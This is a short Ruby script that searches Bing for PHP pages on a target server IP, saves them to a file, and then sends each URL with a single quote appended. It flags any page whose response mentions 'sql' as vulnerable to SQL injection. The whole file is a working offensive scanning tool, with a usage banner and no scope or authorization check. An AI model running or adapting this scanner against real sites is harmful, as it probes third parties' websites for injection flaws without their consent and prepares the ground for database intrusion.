#/usr/bin/env ruby
 
require 'net/http'


def web_count(server_ip,variable)
	file = File.new("website.txt","w")
	(0..6).each do |pages|
		req = Net::HTTP.get_response(URI.parse("http://www.bing.com/search?q=ip%3a#{server_ip}+%22.php%3f#{variable}%3d%22&go=&filt=all&first=#{pages*10 + 1}&FORM=PERE1")) #get the request
		bodys = req.body
		my_array = bodys.split('"')  # split the text
		my_array.each do |words| 
			if words.scan(".php?#{variable}=").size > 0 then #scan for the .php?id=
				if words.scan("http://").size > 0 then
					file.puts words
				end	
			end
		end		
	end
	file.close
end
def check_sql()
	file = File.open("website.txt","r")
	file.each_line do |x|
		web_v = x+"'"
		web_v["\n"]=""
		sql = Net::HTTP.get_response(URI.parse(web_v))
		if sql.body.downcase.scan("sql").size > 0 then
			puts "this web is vulnerable : #{x}"
		end
	end
end

if ARGV.size .eql?(2) == false 
	puts "\nusage [server ip] [variable] ex: ruby DEV.rb 127.0.0.1 id"
else 
	begin 
		puts "		####################"
		puts "		# Start_Search_SQL #"
		puts "		####################"
		web_count(ARGV[0],ARGV[1])
		check_sql()
	rescue
		puts "can't extract website"
	end
end


